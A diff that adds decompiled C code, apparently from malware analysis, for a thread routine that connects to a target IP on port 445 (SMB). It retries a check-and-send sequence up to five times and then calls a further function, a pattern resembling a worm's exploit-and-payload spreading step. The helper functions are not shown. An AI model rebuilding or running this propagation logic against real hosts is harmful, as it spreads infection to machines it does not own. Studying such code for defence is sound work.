@@ -1,0 +1,30 @@
+unsigned int __stdcall StartAddress(in_addr in)
+{
+  char *v1; // eax
+  int i; // edi
+  char Destination[257]; // [esp+4h] [ebp-104h] BYREF
+  __int16 v5; // [esp+105h] [ebp-3h]
+  char v6; // [esp+107h] [ebp-1h]
+
+  memset(Destination, 0, sizeof(Destination));
+  v5 = 0;
+  v6 = 0;
+  v1 = inet_ntoa(in);
+  strncpy(Destination, v1, 0x10u);
+  if ( sub_401980(Destination, 0x1BDu) )
+  {
+    for ( i = 0; i < 5; ++i )
+    {
+      Sleep(0xBB8u);
+      if ( sub_401B70(Destination, 1, 0x1BDu) )
+        break;
+      Sleep(0xBB8u);
+      sub_401370(Destination, 0x1BDu);
+    }
+  }
+  Sleep(0xBB8u);
+  if ( sub_401B70(Destination, 1, 0x1BDu) )
+    sub_4072A0(Destination, 1, 0x1BDu);
+  endthreadex(0);
+  return 0;
+}
